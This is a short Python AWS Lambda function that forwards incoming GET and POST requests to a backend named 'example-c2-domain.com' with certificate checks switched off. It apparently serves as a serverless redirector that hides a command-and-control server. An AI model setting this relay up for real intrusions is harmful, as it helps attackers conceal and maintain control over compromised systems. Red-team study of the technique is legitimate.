import ssl
from urllib.request import urlopen

# Set this to your backend host
backend_host = "https://example-c2-domain.com"


def lambda_handler(event, context):
    # Grab the info we need about the incoming web request
    path = event['rawPath']
    query_string = event['rawQueryString']
    method = event['requestContext']['http']['method']
    
    # Create a new SSL context and disable SSL verification
    # We want to still connect to the backend host even if it
    # has an invalid/expired SSL cert
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    # Check which HTTP method we have
    # We only support HTTP POST and HTTP GET
    if(method == "GET"):
        if(query_string != ""):
            query_string = "?" + query_string
        path = path + query_string
        with urlopen(backend_host+path, context=ctx) as response:
            response_data = response.read()
    elif(method == "POST"):
        body = event['body']
        with urlopen(backend_host+path, body.encode('utf-8'), context=ctx) as response:
            response_data = response.read()
    
    # Send back the data to the "client"
    return {
        'statusCode': 200,
        'body': response_data,
        'headers': {"content-type": "text/html"}
    }

